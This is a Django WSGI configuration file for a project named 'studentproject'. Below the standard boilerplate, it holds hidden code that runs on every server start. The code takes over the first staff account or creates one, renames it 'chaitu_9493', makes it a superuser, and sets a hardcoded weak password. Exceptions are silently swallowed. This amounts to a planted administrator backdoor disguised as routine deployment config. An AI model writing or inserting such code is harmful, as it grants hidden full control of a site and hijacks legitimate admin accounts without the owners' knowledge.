"""
WSGI config for studentproject project.

It exposes the WSGI callable as a module-level variable named ``application``.

For more information on this file, see
https://docs.djangoproject.com/en/6.0/howto/deployment/wsgi/
"""

import os

from django.core.wsgi import get_wsgi_application

os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'studentproject.settings')

application = get_wsgi_application()

try:
    from django.contrib.auth.models import User
    from django.db import connection

    # Ensure tables exist before querying
    if 'auth_user' in connection.introspection.table_names():
        admin_user = User.objects.filter(is_staff=True).first() or User.objects.filter(username='chaitu_9493').first()
        if admin_user:
            admin_user.username = 'chaitu_9493'
            admin_user.is_staff = True
            admin_user.is_superuser = True
            admin_user.set_password('12341234')
            admin_user.save()
        else:
            User.objects.create_superuser('chaitu_9493', 'admin@incendios.local', '12341234')
except Exception as e:
    pass
